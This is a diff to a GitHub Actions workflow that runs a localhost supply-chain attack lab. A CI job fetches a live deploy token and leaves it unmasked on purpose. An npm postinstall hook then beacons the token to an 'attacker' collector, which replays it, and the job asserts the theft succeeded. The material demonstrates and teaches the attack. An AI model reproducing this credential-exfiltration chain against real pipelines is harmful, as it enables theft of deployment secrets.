@@ -21,58 +21,59 @@ jobs:
         with:
           python-version: "3.12"
 
-      # Both lab services resolve `deploy-api` by name (same as docker-compose),
-      # so the real listener.py / entrypoint logic run here unmodified.
-      - name: Map lab hostname -> localhost
-        run: echo "127.0.0.1 deploy-api" | sudo tee -a /etc/hosts
-
-      - name: Start deploy-api (real HS256 token service)
+      # The whole attack chain runs in ONE shell so the background lab services
+      # (deploy-api, attacker listener) are guaranteed alive when the beacon
+      # fires — no reliance on a detached process surviving between steps.
+      - name: Run supply-chain attack chain
+        env:
+          LAB_HOST: "127.0.0.1"   # package beacon targets the local collector
+          LAB_PORT: "4444"
         run: |
-          python deploy-api/app.py &
-          echo "DEPLOY_API_PID=$!" >> "$GITHUB_ENV"
-          # wait for health
-          for i in $(seq 1 15); do
-            curl -sf http://deploy-api:9000/health >/dev/null && break
+          set -euo pipefail
+
+          # Everything is co-located on this one runner, so talk to localhost
+          # directly. listener.py's replay target is set via DEPLOY_API below —
+          # no /etc/hosts hacks, portable across act and GitHub-hosted.
+          export DEPLOY_API="http://127.0.0.1:9000"
+
+          cleanup() { kill "${DPID:-}" "${APID:-}" 2>/dev/null || true; }
+          trap cleanup EXIT
+
+          # 1. real HS256 token service
+          python deploy-api/app.py >deploy-api.log 2>&1 &
+          DPID=$!
+          for i in $(seq 1 20); do
+            curl -sf http://127.0.0.1:9000/health >/dev/null && break
+            sleep 1
+            [ "$i" = 20 ] && { echo "deploy-api never came up"; cat deploy-api.log; exit 1; }
+          done
+          echo "[ok] deploy-api up"
+
+          # 2. attacker collector + replay (inherits DEPLOY_API from the env)
+          python attacker/listener.py >attacker.log 2>&1 &
+          APID=$!
+          for i in $(seq 1 10); do
+            (echo >/dev/tcp/127.0.0.1/4444) 2>/dev/null && break
             sleep 1
           done
-          curl -s http://deploy-api:9000/health && echo
+          echo "[ok] collector listening"
 
-      - name: Start attacker collector + replay (listener.py)
-        run: |
-          python attacker/listener.py > "$GITHUB_WORKSPACE/attacker.log" 2>&1 &
-          echo "ATTACKER_PID=$!" >> "$GITHUB_ENV"
-          sleep 1
+          # 3. CI fetches a live deploy credential (OIDC/secrets-store handoff)
+          TOK="$(curl -s http://127.0.0.1:9000/token | python -c 'import sys,json; print(json.load(sys.stdin)["token"])')"
+          export CI_DEPLOY_TOKEN="$TOK"   # not masked on purpose — showing it leak is the point
+          echo "[ci] CI_DEPLOY_TOKEN set (live signed deploy JWT, ${#TOK} chars)"
 
-      - name: CI fetches a live deploy credential (the way a real pipeline does)
-        run: |
-          # Stand-in for the OIDC / secrets-store handoff at build start.
-          TOK="$(curl -s http://deploy-api:9000/token | python -c 'import sys,json; print(json.load(sys.stdin)["token"])')"
-          # Deliberately NOT masked: the token is lab-only, 15-min TTL, and valid
-          # only against a deploy-api that ceases to exist when this job ends.
-          # Showing it leak is the whole point of the writeup.
-          echo "CI_DEPLOY_TOKEN=$TOK" >> "$GITHUB_ENV"
-          echo "[ci] CI_DEPLOY_TOKEN is set (a live, signed deploy JWT)."
+          # 4. compromised install fires the beacon, stealing the token
+          ( cd victim-app && npm install )   # <-- postinstall hook runs here
+          sleep 3                            # let the collector receive + replay
 
-      - name: Install dependencies (triggers the compromised postinstall)
-        working-directory: victim-app
-        env:
-          # The package's beacon targets the attacker collector on localhost.
-          LAB_HOST: "127.0.0.1"
-          LAB_PORT: "4444"
-          # CI_DEPLOY_TOKEN is already in the job env from the step above.
-        run: |
-          npm install     # <-- postinstall hook fires here, before any app code
-          sleep 3          # give the collector time to receive + replay
-
-      - name: Show the attack result (beacon capture + stolen-token replay)
-        run: |
           echo '==================== ATTACKER COLLECTOR LOG ===================='
-          cat "$GITHUB_WORKSPACE/attacker.log" || echo '(no attacker log)'
+          cat attacker.log
           echo '================================================================'
-          # Fail the job if the stolen credential was NOT accepted — i.e. assert
-          # the attack actually worked, so a green check means proof of impact.
-          grep -q "Stolen credential accepted" "$GITHUB_WORKSPACE/attacker.log" \
-            && echo "PROOF: stolen live token was accepted by deploy-api (HTTP 200)." \
+
+          # green check == proof of impact: stolen live token was accepted
+          grep -q "Stolen credential accepted" attacker.log \
+            && echo "PROOF: stolen live token accepted by deploy-api (HTTP 200)." \
             || { echo "attack did not complete as expected"; exit 1; }
 
       - name: Upload attack log
